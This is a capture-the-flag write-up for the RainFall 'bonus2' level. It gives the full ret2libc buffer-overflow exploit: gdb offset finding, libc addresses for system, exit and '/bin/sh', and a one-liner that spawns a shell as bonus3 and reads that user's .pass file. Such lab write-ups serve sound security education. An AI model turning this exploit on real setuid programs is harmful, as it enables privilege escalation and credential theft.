Bonus2 protections:
```Shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```

Bonus2 rights:
```Shell
bonus2@RainFall:~$ ls -la bonus2
-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
```

Testing:
```Shell
bonus2@RainFall:~$ ./bonus2 KIKI KOKO
Hello KIKI
bonus2@RainFall:~$ ./bonus2 KIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIKI KOKO
Hello KIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIKOKO
```

Let's decompile it with Hex-Rays on https://dogbolt.org/ and see what is there:
- it takes two arguments, of max size 40-bytes and 32-bytes
- it makes calls to `strcat()` and `strcpy()`, as well as a call to `greetuser()`
- it uses an environment variable to set the language of your choice

Unfortunately, there is no easy way to open a shell. So we decided to try a `ret2libc` attack. For this, we need to:
- find the size of our payload to know to find where to overwrite `EIP`
- find the addresses of `system()`, `exit()` (this is not necessary, but it is better practice for exiting cleanly) and the string `/bin/sh`

Since the first arg is 40-bytes, we can just pad the whole thing with `A`s and generate a pattern for the second arg:
```Shell
(gdb) run
Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```
This gives us an offset of 18, which added to the previous 40 bytes equals to 58. It means that the second arg will start with a padding of 18 `A`s.

Next, let's find all the addresses we need.
`system()` is \xb7\xe6\xb0\x60:
```Shell
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

`/bin/sh` is \xb7\xf8\xcc\x58:
```Shell
(gdb) find &system,+9999999,"/bin/sh"  
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

And `exit()` is \xb7\xe5\xeb\xe0:
```Shell
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

And this is the result:
```Shell
bonus2@RainFall:~$ ./bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("A" * 18 + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\xb7\xf8\xcc\x58"[::-1])')
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`�����X���
$ cat /home/user/bonus3/.pass
```
